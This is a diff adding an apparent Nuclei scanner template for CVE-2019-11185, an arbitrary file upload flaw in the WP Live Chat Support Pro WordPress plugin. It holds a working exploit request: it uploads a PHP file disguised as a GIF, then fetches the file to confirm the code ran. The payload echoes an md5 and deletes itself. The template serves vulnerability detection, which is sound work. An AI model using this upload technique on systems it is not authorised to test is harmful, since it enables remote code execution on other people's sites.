@@ -1,0 +1,64 @@
+id: wordpress-wp-live-chat-file-upload
+
+info:
+  name: WordPress WP Live Chat Support Pro Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    A vulnerability in the WP Live Chat Support Pro plugin < 8.0.26 allows arbitrary file upload via the remote_upload API.
+  reference:
+    - https://wpscan.com/vulnerability/9320
+  classification:
+    cve-id: CVE-2019-11185
+    cvss-metrics: 9.8/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+
+variables:
+  random_string: "{{rand_text_alphanumeric(6)}}"
+  file_name: "{{concat(rand_text_alphanumeric(8), '.gif.phtml')}}"
+  shell_payload: "GIF89a<?php echo md5('{{random_string}}');unlink(__FILE__);?>"
+
+http:
+  - raw:
+      - |
+        POST /wp-json/wp_live_chat_support/v1/remote_upload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=01f41cc9fb3144325ffb56bfb900037a
+
+        --01f41cc9fb3144325ffb56bfb900037a
+        Content-Disposition: form-data; name="timestamp"
+
+        1528969272366
+        --01f41cc9fb3144325ffb56bfb900037a
+        Content-Disposition: form-data; name="file"; filename="{{file_name}}"
+        Content-Type: image/gif
+
+        {{shell_payload}}
+        --01f41cc9fb3144325ffb56bfb900037a--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "\\.phtml"
+    extractors:
+      - type: regex
+        name: shell_url
+        group: 1
+        internal: true
+        regex:
+          - "\"response\":\"(.*?.phtml)\""
+
+  - raw:
+      - |
+        GET {{shell_url}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5(random_string)}}"
